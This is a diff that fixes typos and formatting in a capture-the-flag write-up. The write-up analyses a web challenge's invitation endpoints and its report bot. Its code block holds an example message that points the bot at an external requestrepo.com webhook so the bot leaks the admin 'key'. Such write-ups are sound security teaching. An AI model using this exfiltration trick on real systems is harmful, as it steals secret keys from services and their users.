@@ -9,7 +9,7 @@ There's maybe nothing spectial in description. 🤔
 
 ![Oops](./image/home.jpg)
 
-There are 3 bottons here. Two first buttons seem common, so let try the last one.
+There are 3 buttons here. The first two buttons seem common, so let try the last one.
 
 I am allowed to create an invitation and to report issues about invitation.
 
@@ -22,7 +22,7 @@ Each invitation has an id.
 
 `/post/<string(length=16):id>`: I can get an invitation through this endpoint by supplying `id` (`len(id) == 16`). Besides, I can supply a `key` and make `is_admin` take value `True` to receive the flag. Maybe my target is `key` value.
 
-`/api/new`: This creates post. I POST `title`, `content` and server will generate `id` for that post. Posts will be saved in database (`id`, `title`, `content`).
+`/api/new`: This endpoint creates post. I POST `title`, `content` and server will generate `id` for that post. Posts will be saved in database (`id`, `title`, `content`).
 
 `api/delete`: Deletes a post if I had `id` and `key`.
 
@@ -33,8 +33,7 @@ message = f"URL: {url}?key={key}\nReason: {reason}"
 
 Because there is bot directory, maybe I need to bypass check stages and make message contain my webhook like:
 ```py
-f'URL: http://hjvnswkt.requestrepo.com?key={key}
-Reason: something'
+f'URL: http://hjvnswkt.requestrepo.com?key={key}\nReason: something'
 ```
 Or some messages similar. And the bot will click on the URL/send request and the key will be revealed. (In an ideal scenario) 🤤 
 
